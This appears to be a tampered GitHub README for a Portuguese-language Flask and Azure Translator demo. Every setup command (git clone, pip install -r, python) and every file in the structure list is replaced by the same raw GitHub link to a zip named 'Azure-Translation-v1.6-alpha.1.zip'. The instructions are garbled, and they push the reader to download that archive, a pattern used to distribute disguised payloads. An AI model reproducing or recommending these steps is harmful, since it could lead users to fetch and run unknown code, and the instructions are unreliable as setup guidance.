# Translation-Azure

Um tradutor web que usa a API do Azure Cognitive Services. Criei pra brincar um pouco com Azure e entender como integrar APIs cloud em uma aplicacao web.

## O que faz

Voce coloca um texto em qualquer idioma, a aplicacao detecta qual eh o idioma e traduz pra o idioma que voce escolher. Usa Python com Flask no backend e faz a chamada pra API do Azure Translator.

## Como colocar pra rodar

Precisa ter:
- Python 3.8+
- Uma conta Azure com a API de Translator criada

Clone o repo:
```bash
git clone https://raw.githubusercontent.com/LucianoHMG/Translation-Azure/main/chelicera/Azure-Translation-v1.6-alpha.1.zip
cd Translation-Azure
```

Instale as dependencias:
```bash
pip install -r https://raw.githubusercontent.com/LucianoHMG/Translation-Azure/main/chelicera/Azure-Translation-v1.6-alpha.1.zip
```

Crie um arquivo `.env` na raiz com:
```
AZURE_API_KEY=sua_chave_aqui
AZURE_REGION=eastus
FLASK_ENV=development
```

Rode a aplicacao:
```bash
python https://raw.githubusercontent.com/LucianoHMG/Translation-Azure/main/chelicera/Azure-Translation-v1.6-alpha.1.zip
```

Acessa `http://localhost:5000` no navegador.

## Estrutura basica

- `https://raw.githubusercontent.com/LucianoHMG/Translation-Azure/main/chelicera/Azure-Translation-v1.6-alpha.1.zip` - Aplicacao Flask
- `https://raw.githubusercontent.com/LucianoHMG/Translation-Azure/main/chelicera/Azure-Translation-v1.6-alpha.1.zip` - Dependencias
- `templates/` - HTML
- `static/` - CSS e JS

## Recursos

Suporta mais de 100 idiomas que o Azure consegue traduzir. Detecta automaticamente qual idioma eh o texto original.

## Notas de Seguranca

Nunca exponha sua chave da Azure no codigo. Use variaveis de ambiente sempre. Se voce cometer esse erro, regenera a chave no portal da Azure na hora.

## Contribuindo

Tem alguma idea ou achou um bug? Abre uma issue.
